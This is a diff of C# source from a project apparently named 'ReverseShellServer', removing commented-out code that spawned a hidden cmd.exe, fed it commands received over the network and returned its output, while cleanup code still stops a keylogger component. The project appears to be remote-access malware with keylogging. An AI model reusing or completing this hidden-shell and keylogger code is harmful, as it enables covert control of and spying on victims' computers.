@@ -10,9 +10,6 @@ namespace ReverseShellServer
 {
     public class ServerManager
     {
-        // Process processCmd { get; set; }
-
-
         public ServerManager()
         {
             // Only one instance can run, random string identifier
@@ -40,25 +37,6 @@ namespace ReverseShellServer
             {
                 return;
             }
-
-            /*processCmd = new Process
-            {
-                StartInfo =
-                {
-                    FileName = "cmd.exe",
-                    CreateNoWindow = true,
-                    UseShellExecute = false,
-                    StandardOutputEncoding = Encoding.GetEncoding(850),
-                    RedirectStandardOutput = true,
-                    RedirectStandardInput = true,
-                    RedirectStandardError = true
-                },
-            };
-            processCmd.OutputDataReceived += CmdOutputDataHandler;
-            processCmd.Start();
-            processCmd.BeginOutputReadLine();
-
-            SayHelloToCmd();*/
 
             while (true)
             {
@@ -97,57 +75,14 @@ namespace ReverseShellServer
                 {
                     StopServer();
                 }
-                //SayHelloToCmd();
-            }/*
-            else
-            {
-                processCmd.StandardInput.WriteLine($"{receivedData}\n");
-            }*/
+            }
         }
-
-
-        //void SayHelloToCmd() => processCmd.StandardInput.WriteLine("Hello !\n");
-
-
-        /// <summary>
-        /// Send output to client
-        /// </summary>
-        /// <param name="sendingProcess"></param>
-        /// <param name="outLine"></param>
-        /*void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
-        {
-            var output = outLine.Data;
-            if (string.IsNullOrEmpty(outLine.Data)) return;
-
-            try
-            {
-                // Check if the line is the one representing the path
-                if (output.Substring(1, 2) == ":\\" && output.Contains(">"))
-                {
-                    // Represents path + > + command
-                    if (output[output.Length - 1] != '>')
-                    {
-                        return;
-                    }
-
-                    // Change current working directory to the path and return
-                    Directory.SetCurrentDirectory(output.Substring(0, output.Length - 1));
-                }
-                    
-                GlobalNetworkManager.WriteLine(output);
-            }
-            catch (Exception)
-            {
-                // ignored
-            }
-        }*/
 
 
         void Cleanup()
         {
             try
             {
-                //processCmd.Kill();
                 MainWindow.keyLoggerManager.Stop();
                 GlobalNetworkManager.ServerNetworkManager.Cleanup();
             }
